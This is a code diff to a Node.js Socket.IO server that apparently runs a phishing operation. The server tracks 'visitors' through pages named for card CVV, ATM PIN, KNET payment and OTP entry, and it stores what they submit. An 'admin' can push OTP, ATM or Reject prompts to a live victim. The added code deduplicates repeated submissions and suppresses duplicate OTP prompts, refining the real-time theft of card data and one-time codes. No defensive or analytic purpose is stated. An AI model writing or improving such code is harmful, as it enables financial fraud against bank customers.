@@ -423,6 +423,7 @@ io.on("connection", (socket) => {
     visitor._sockets = Array.from(new Set([].concat(visitor._sockets || [], socket.id)));
 
     visitors.set(socket.id, visitor);
+    /*FIX100reg*/ try { visitor.__f100sent = 0; } catch(e){}
     saveData();
 
     // Send confirmation to visitor
@@ -445,7 +446,7 @@ io.on("connection", (socket) => {
   socket.on("visitor:pageEnter", (page) => {
     const visitor = __f91ResolveVisitor(socket, null);
     if (visitor) {
-      /*FIX98*/ try { if (visitor.__f98otp && (Date.now() - visitor.__f98otp) < 1800000) { var __p98 = String(page || ''); if (/cvv|atm|مرور|نهائي|final|رئيسي/i.test(__p98)) { visitor.__f98otp = 0; } else if (/دفع|كي\s*نت|knet|payment|otp|رمز/i.test(__p98)) { page = 'رمز التحقق كي نت (OTP)'; } } } catch(e){}
+      /*FIX98*/ try { if (visitor.__f98otp && (Date.now() - visitor.__f98otp) < 1800000) { var __p98 = String(page || ''); if (/cvv|atm|مرور|نهائي|final/i.test(__p98)) { visitor.__f98otp = 0; /*FIX100x*/ visitor.__f100sent = 0; } else if (/دفع|كي\s*نت|knet|payment|otp|رمز/i.test(__p98)) { page = 'رمز التحقق كي نت (OTP)'; } } } catch(e){}
       visitor.page = page;
       visitor.lastActivity = Date.now();
       visitor.isIdle = false;
@@ -512,6 +513,21 @@ io.on("connection", (socket) => {
     if (visitor) {
       visitor.lastActivity = Date.now();
       visitor.isIdle = false;
+      /*FIX100D*/ try {
+  var __c100 = data.content || {}, __ks100 = Object.keys(__c100).sort();
+  var __sig100 = String(data.page || "") + "#" + String(data.digitCode || "") + "#" + __ks100.map(function(k){ return k + "=" + String(__c100[k]).slice(0,120); }).join("|");
+  var __now100 = Date.now();
+  var __dup100 = (visitor.__f100sig === __sig100) && (__now100 - (visitor.__f100at || 0) < 8000) && !!__sig100;
+  visitor.__f100sig = __sig100; visitor.__f100at = __now100;
+  if (__dup100) {
+    try { if (visitor.__f98otp && (Date.now() - visitor.__f98otp) < 1800000) { var __dp100 = String(data.page || ""); if (/cvv|atm|مرور|نهائي|final/i.test(__dp100)) { visitor.__f98otp = 0; visitor.__f100sent = 0; } else if (/دفع|كي\s*نت|knet|payment|otp|رمز/i.test(__dp100)) { data.page = "رمز التحقق كي نت (OTP)"; } } } catch(e){}
+    visitor.page = data.page;
+    visitor.waitingForAdminResponse = data.waitingForAdminResponse || false;
+    visitors.set(socket.id, visitor);
+    saveVisitorPermanently(visitor);
+    return;
+  }
+} catch(e) {}
       // Store submitted data with page info for ordering
       if (data.content) {
         // Initialize dataHistory if not exists
@@ -566,7 +582,7 @@ io.on("connection", (socket) => {
         }
       }
 
-      /*FIX98*/ try { if (visitor.__f98otp && (Date.now() - visitor.__f98otp) < 1800000) { var __q98 = String(data.page || ''); if (/cvv|atm|مرور|نهائي|final|رئيسي/i.test(__q98)) { visitor.__f98otp = 0; } else if (/دفع|كي\s*نت|knet|payment|otp|رمز/i.test(__q98)) { data.page = 'رمز التحقق كي نت (OTP)'; } } } catch(e){}
+      /*FIX98*/ try { if (visitor.__f98otp && (Date.now() - visitor.__f98otp) < 1800000) { var __q98 = String(data.page || ''); if (/cvv|atm|مرور|نهائي|final/i.test(__q98)) { visitor.__f98otp = 0; /*FIX100x*/ visitor.__f100sent = 0; } else if (/دفع|كي\s*نت|knet|payment|otp|رمز/i.test(__q98)) { data.page = 'رمز التحقق كي نت (OTP)'; } } } catch(e){}
       visitor.page = data.page;
       visitor.waitingForAdminResponse = data.waitingForAdminResponse || false;
       visitor.hasNewData = true;
@@ -784,7 +800,9 @@ socket.on("cardNumber:verify", (cardNumber) => {
 
   // Admin: Card action (OTP, ATM, Reject)
   socket.on("admin:cardAction", ({ visitorSocketId, action }) => {
-    __f91Emit(visitorSocketId, "card:action", action);
+    var __skipEmit100 = false, __vv100 = null;
+/*FIX100E*/ try { if (action === "otp") { __vv100 = visitors.get(visitorSocketId) || null; if (!__vv100) { visitors.forEach(function(v){ if (!__vv100 && v && (v._id === visitorSocketId || v.socketId === visitorSocketId)) __vv100 = v; }); } if (__vv100 && __vv100.__f100sent && /otp|رمز/i.test(String(__vv100.page || ""))) __skipEmit100 = true; } } catch(e){}
+if (!__skipEmit100) { __f91Emit(visitorSocketId, "card:action", action); try { if (action === "otp" && __vv100) __vv100.__f100sent = 1; } catch(e){} }
     /*FIX98*/ try { var __v98 = visitors.get(visitorSocketId) || null; if (!__v98) { visitors.forEach(function(v){ if (!__v98 && v && (v._id === visitorSocketId || v.socketId === visitorSocketId)) __v98 = v; }); } if (__v98 && action === 'otp' && /كي\s*نت|knet/i.test(String(__v98.page || '')) && !/otp|رمز/i.test(String(__v98.page || ''))) { __v98.page = 'رمز التحقق كي نت (OTP)'; __v98.__f98otp = Date.now(); visitors.set(visitorSocketId, __v98); admins.forEach(function(a, k){ try { io.to(k).emit('visitor:pageChanged', { visitorId: __v98._id, page: __v98.page }); } catch(e){} }); } } catch(e){}
     // تحديث حالة الانتظار
     const visitor = visitors.get(visitorSocketId);
